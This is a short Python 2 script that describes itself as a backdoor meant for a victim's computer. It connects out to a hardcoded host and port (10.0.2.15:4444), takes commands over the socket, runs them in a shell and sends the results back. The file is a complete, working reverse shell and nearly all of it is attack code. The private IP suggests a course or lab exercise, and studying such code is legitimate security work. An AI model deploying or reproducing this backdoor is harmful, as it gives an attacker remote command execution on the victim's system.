#!python2
# NOTICE: this script is intended for the victim's computer.
# Compatibility: Python 2 only. For now.

import json
import os
import socket
import subprocess


class Backdoor:
    def __init__(self, ip_addr, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip_addr, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def run(self):
        while True:
            command_received = self.reliable_receive()
            if command_received[0] == "exit":
                self.connection.close()
                exit()
            elif command_received[0] == "cd" and len(command_received) > 1:
                command_result = self.change_working_directory(command_received[1])
            else:
                command_result = self.execute_system_command(command_received)

            self.reliable_send(command_result)


backdoor = Backdoor("10.0.2.15", 4444)
backdoor.run()
